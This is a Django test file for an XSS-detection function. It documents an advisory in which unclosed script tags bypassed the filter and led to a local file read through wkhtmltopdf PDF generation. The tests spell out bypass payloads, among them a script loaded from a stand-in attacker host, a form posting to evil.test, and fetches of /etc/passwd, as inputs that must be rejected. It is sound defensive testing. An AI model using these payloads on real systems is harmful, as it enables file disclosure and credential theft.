"""has_xss must match an opening tag, not a well-formed element.

GHSA-cjr4-rrp6-g72j reported a local file read through PDF generation, guarded
only by has_xss. The guard was bypassable: the script pattern was

    <\\s*script.*?>.*?<\\s*/\\s*script\\s*>

which requires a CLOSING tag. `<script>fetch("file:///etc/passwd")` with no
`</script>` matched nothing, while an HTML parser runs an unclosed script to
end-of-document. generate_pdf hands the body to wkhtmltopdf with
--enable-local-file-access (pdfkit 1.0.0, PYSEC-2026-2860), so that is a file
read and exfiltration primitive, not just stored XSS.

The same shape applied to the active-content pattern, which required a closing
">" that an attacker simply omits.

These tests are written as two halves on purpose. A blocklist that rejects
everything is not a fix -- it is an outage -- and the reason the original
validation was disabled once before was exactly that kind of over-reach.
"""

from django.test import SimpleTestCase

from horilla.models import has_xss


class HasXssOpeningTagTests(SimpleTestCase):
    def test_unclosed_script_is_caught(self):
        """The reported bypass. Blocked only by matching the opening tag."""
        for payload in (
            '<script src="http://evil.test/x.js">',
            '<script>fetch("file:///etc/passwd")',
            "< script >x",
        ):
            with self.subTest(payload=payload):
                self.assertTrue(has_xss(payload))

    def test_closed_script_still_caught(self):
        self.assertTrue(has_xss("<script>alert(1)</script>"))

    def test_unclosed_active_content_is_caught(self):
        """The active-content pattern required a closing '>' too."""
        for payload in (
            '<iframe src="file:///etc/passwd"',
            "<embed src=x",
            "<object data=x",
        ):
            with self.subTest(payload=payload):
                self.assertTrue(has_xss(payload))

    def test_file_scheme_is_caught(self):
        """file:// has no legitimate use in user-authored content, and is a
        local read once the document reaches wkhtmltopdf."""
        for payload in (
            '<img src="file:///etc/passwd">',
            '<div style="background:url(file:///etc/passwd)">',
            "file : / / /etc/passwd",
        ):
            with self.subTest(payload=payload):
                self.assertTrue(has_xss(payload))

    def test_base_and_form_are_caught(self):
        """<base> rebases every relative URL in the document; <form> turns a
        rendered page into a credential harvester."""
        self.assertTrue(has_xss('<base href="file:///">'))
        self.assertTrue(has_xss('<form action="http://evil.test">'))

    def test_event_handlers_and_js_urls_still_caught(self):
        self.assertTrue(has_xss("<img src=x onerror=alert(1)>"))
        self.assertTrue(has_xss('<a href="javascript:alert(1)">x</a>'))
        # entity-encoded, which the double html.unescape exists to catch
        self.assertTrue(has_xss('<a href="jav&#x61;script:alert(1)">x</a>'))

    # --- the half that must keep working -------------------------------

    def test_ordinary_prose_is_not_rejected(self):
        """A word boundary after the tag name is what keeps these clean --
        without it, 'scriptural' and 'linked' would match."""
        for value in (
            "Please review the attached invoice.",
            "See the onboarding script for details.",
            "<p>scriptural reference</p>",
            "<p>The linked metadata form is attached.</p>",
            "O'Brien-Smith",
        ):
            with self.subTest(value=value):
                self.assertFalse(has_xss(value))

    def test_rich_text_is_not_rejected(self):
        for value in (
            "<p>Meeting at <strong>3pm</strong> in <em>Room 2</em></p>",
            '<a href="https://example.com">portal</a>',
            '<img src="https://cdn.example.com/logo.png">',
            "<table><tr><td>Jan</td><td>100</td></tr></table>",
        ):
            with self.subTest(value=value):
                self.assertFalse(has_xss(value))

    def test_local_media_paths_are_not_rejected(self):
        """PDF templates reference the company logo by filesystem path, which
        is why enable-local-file-access exists. Only the file:// scheme is
        refused, not every absolute path."""
        self.assertFalse(has_xss("/media/base/company/icon/logo.png"))

    def test_non_string_input(self):
        self.assertFalse(has_xss(None))
        self.assertFalse(has_xss(42))
